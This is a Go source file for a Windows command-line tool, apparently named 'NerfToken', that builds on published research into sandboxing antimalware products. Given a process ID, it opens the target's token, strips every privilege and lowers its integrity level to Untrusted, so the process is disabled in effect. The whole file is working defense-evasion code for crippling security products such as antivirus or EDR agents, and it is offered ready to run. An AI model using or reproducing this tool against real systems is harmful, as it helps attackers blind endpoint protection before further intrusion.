package main

// Credits to Gabriel Landau (@gabriellandau) for his findings
// https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const ML_UNTRUSTED = "S-1-16-0"

var (
	advapi32, _                = syscall.LoadDLL("advapi32.dll")
	procSetTokenInformation, _ = advapi32.FindProc("SetTokenInformation")
)

func setTokenMandatoryLabel(token windows.Token, tokenInformationClass uint32, tml windows.Tokenmandatorylabel, tmlLen uint32) (result uintptr, err error) {
	result, _, err = procSetTokenInformation.Call(
		uintptr(token),
		uintptr(tokenInformationClass),
		uintptr(unsafe.Pointer(&tml)),
		uintptr(tmlLen),
	)
	if result == 0 {
		return result, os.NewSyscallError("SetTokenInformation", err)
	}
	return result, nil
}

func banner() {
	fmt.Println("  _   _            __ _______    _                                   ")
	fmt.Println(" | \\ | |          / _|__   __|  | |                                  ")
	fmt.Println(" |  \\| | ___ _ __| |_   | | ___ | | _____ _ __                       ")
	fmt.Println(" | . ` |/ _ \\ '__|  _|  | |/ _ \\| |/ / _ \\ '_ \\                      ")
	fmt.Println(" | |\\  |  __/ |  | |    | | (_) |   <  __/ | | |                     ")
	fmt.Println(" |_|_\\_|\\___|_|_ |_|    |_|\\___/|_|\\_\\___|_| |_| _ _   _             ")
	fmt.Println("  / ____|     | |                   |  ____|  | (_) | (_)            ")
	fmt.Println(" | |  __  ___ | | __ _ _ __   __ _  | |__   __| |_| |_ _  ___  _ __  ")
	fmt.Println(" | | |_ |/ _ \\| |/ _` | '_ \\ / _` | |  __| / _` | | __| |/ _ \\| '_ \\ ")
	fmt.Println(" | |__| | (_) | | (_| | | | | (_| | | |___| (_| | | |_| | (_) | | | |")
	fmt.Println("  \\_____|\\___/|_|\\__,_|_| |_|\\__, | |______\\__,_|_|\\__|_|\\___/|_| |_|")
	fmt.Println("                              __/ |                                  ")
	fmt.Println("                             |___/                                   ")
	fmt.Println("")
	fmt.Println("    Author  : Raphaël Almeida (raphael.almeida@tnpconsultants.com)")
	fmt.Println("    Credits : Garbiel Landau (@gabriellandau)")
}

func main() {
	banner()
	if len(os.Args) < 2 {
		fmt.Println("Error, missing PID !")
		fmt.Printf("Usage: %s <PID>\n\n", os.Args[0])
		return
	}
	strpid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("[-] Error with the provided PID, please make sure it's an integer")
		return
	}
	pid := uint32(strpid)

	// Get handle on target process
	pHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		fmt.Println("Error getting handle on process")
		panic(err)
	}
	fmt.Println("[+] Successfully retrieved handle of the process")

	// Get handle on tokens
	var processToken windows.Token
	err = windows.OpenProcessToken(pHandle, windows.TOKEN_ALL_ACCESS, &processToken)
	if err != nil {
		fmt.Println("Error getting handle on process tokens")
		panic(err)
	}
	fmt.Println("[+] Successfully retrieved handle of tokens")

	// First get token information size
	var tokenInfoSize uint32 = 0
	_ = windows.GetTokenInformation(processToken, syscall.TokenPrivileges, nil, 0, &tokenInfoSize)
	if tokenInfoSize == 0 {
		fmt.Println("Error getting size of tokenInformation")
		return
	}
	fmt.Println("[+] Successfully retrieved tokenInfoSize, tokenInfoSize =", tokenInfoSize)

	// Now get the actual infos
	tokenInformation := bytes.NewBuffer(make([]byte, tokenInfoSize))
	err = windows.GetTokenInformation(processToken, windows.TokenPrivileges, &tokenInformation.Bytes()[0], uint32(tokenInformation.Len()), &tokenInfoSize)
	if err != nil {
		fmt.Println("Error getting tokenInformation")
		panic(err)
	}
	fmt.Println("[+] Successfully retrieved tokenInformation")

	var privilegeCount uint32
	err = binary.Read(tokenInformation, binary.LittleEndian, &privilegeCount)
	if err != nil {
		fmt.Println("Error getting privilegeCount")
		panic(err)
	}
	fmt.Println("[+] Successfully retrieved privilegeCount, privilegeCount =", privilegeCount)

	for i := uint32(0); i < privilegeCount; i++ {
		var tempLuid int64
		err = binary.Read(tokenInformation, binary.LittleEndian, &tempLuid)
		if err != nil {
			fmt.Println("Error getting LUID")
			panic(err)
		}

		var attributes uint32
		err = binary.Read(tokenInformation, binary.LittleEndian, &attributes)
		if err != nil {
			fmt.Println("Error getting LUID")
			panic(err)
		}

		var luid = windows.LUID{
			LowPart:  uint32(tempLuid), // Don't ask
			HighPart: 0,
		}

		newTokenPrivs := windows.Tokenprivileges{
			PrivilegeCount: 1,
			Privileges: [1]windows.LUIDAndAttributes{{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_REMOVED,
			}},
		}

		err = windows.AdjustTokenPrivileges(processToken, false, &newTokenPrivs, 0, nil, nil)
		if err != nil {
			fmt.Println("Error in AdjustTokenPrivileges, err =", err)
			panic(err)
		}
	}
	fmt.Println("[+] Successfully adjusted privileges")

	// Now onto the label
	var sid *windows.SID
	utf16str, err := windows.UTF16PtrFromString(ML_UNTRUSTED)
	if err != nil {
		fmt.Println("Failed to UTF16PtrFromString, err =", err)
		panic(err)
	}

	err = windows.ConvertStringSidToSid(utf16str, &sid)
	if err != nil {
		fmt.Println("Failed to ConvertStringSidToSid, err =", err)
		panic(err)
	}

	tml := windows.Tokenmandatorylabel{Label: windows.SIDAndAttributes{
		Sid:        sid,
		Attributes: windows.SE_GROUP_INTEGRITY,
	}}

	result, err := setTokenMandatoryLabel(processToken, windows.TokenIntegrityLevel, tml, tml.Size())
	if err != nil {
		fmt.Println("Error in setTokenMandatoryLabel, result =", result, " err =", err)
		panic(err)
	} else if result == 0 {
		fmt.Println("Error result == 0, result =", result)
		return
	}
	fmt.Println("[+] Successfully set Mandatory label to untrusted !")
	fmt.Println("[+] It's done, your process is nerfed !")
}
